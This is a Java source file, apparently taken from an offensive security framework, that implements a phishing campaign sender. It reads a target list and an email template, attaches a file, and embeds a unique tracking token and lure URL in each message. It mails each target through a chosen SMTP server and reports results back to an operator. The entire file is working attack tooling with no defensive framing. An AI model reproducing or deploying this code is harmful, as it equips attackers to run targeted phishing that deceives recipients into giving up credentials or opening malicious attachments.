package phish;

import common.AObject;
import common.CommonUtils;
import common.MudgeSanity;
import common.PhishEvents;
import common.Request;
import dialog.DialogUtils;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import mail.Eater;
import server.ManageUser;
import server.Phisher;
import server.Resources;
import server.ServerUtils;

public class Campaign extends AObject implements Runnable, SmtpNotify {
    protected Request request;

    protected ManageUser client;

    protected Resources resources;

    protected Map options;

    protected Phisher phisher;

    protected String templated;

    protected String sid;

    protected boolean keepgoing = true;

    public Campaign(Phisher paramPhisher, Request request, ManageUser manageUser, Resources resources) {
        this.phisher = paramPhisher;
        this.request = request;
        this.client = manageUser;
        this.resources = resources;
        this.sid = (String) request.arg(0);
        this.templated = (String) request.arg(1);
        this.options = (Map) request.arg(2);
        new Thread(this, "Phishing Campaign").start();
    }

    public void update(String string) {
        this.resources.send(this.client, "phishstatus." + this.sid, string);
    }

    public void cancel() {
        this.keepgoing = false;
    }

    public void run() {
        try {
            String str1 = DialogUtils.string(this.options, "attachmentr");
            String str2 = DialogUtils.string(this.options, "template");
            String str3 = DialogUtils.string(this.options, "bounce");
            String str4 = DialogUtils.string(this.options, "server");
            String str5 = DialogUtils.string(this.options, "url");
            List list = (List) this.options.get("targets");
            PhishEvents phishEvents = new PhishEvents(this.sid);
            Eater eater = new Eater(new ByteArrayInputStream(CommonUtils.toBytes(this.templated)));
            String str6 = eater.getSubject();
            if (str1 != null && !"".equals(str1) && (new File(str1)).exists())
                eater.attachFile(str1);
            this.resources.sendAndProcess(this.client, "phishlog." + this.sid, phishEvents.SendmailStart(list.size(), str1, str3, str4, str6, str2, str5));
            Iterator iterator = list.iterator();
            while (iterator.hasNext() && this.keepgoing) {
                Map map = (Map) iterator.next();
                String str7 = map.get("To") + "";
                String str8 = map.get("To_Name") + "";
                String str9 = CommonUtils.ID().substring(24, 36);
                ServerUtils.addToken(this.resources, str9, str7, this.sid);
                SmtpClient smtpClient = new SmtpClient(this);
                try {
                    this.resources.sendAndProcess(this.client, "phishlog." + this.sid, phishEvents.SendmailPre(str7));
                    String str10 = CommonUtils.bString(eater.getMessage(null, "".equals(str8) ? str7 : (str8 + " <" + str7 + ">")));
                    str10 = PhishingUtils.updateMessage(str10, map, str5, str9);
                    String str11 = smtpClient.send_email(str4, str3, str7, str10);
                    this.resources.sendAndProcess(this.client, "phishlog." + this.sid, phishEvents.SendmailPost(str7, "SUCCESS", str11, str9));
                } catch (Exception exception) {
                    MudgeSanity.logException("phish to " + str7 + " via " + str4, exception, false);
                    this.resources.sendAndProcess(this.client, "phishlog." + this.sid, phishEvents.SendmailPost(str7, "Failed", exception.getMessage(), str9));
                }
                smtpClient.cleanup();
                update("");
            }
            this.resources.sendAndProcess(this.client, "phishlog." + this.sid, phishEvents.SendmailDone());
            this.resources.call("tokens.push");
        } catch (Exception exception) {
            MudgeSanity.logException("Campaign", exception, false);
        }
    }
}
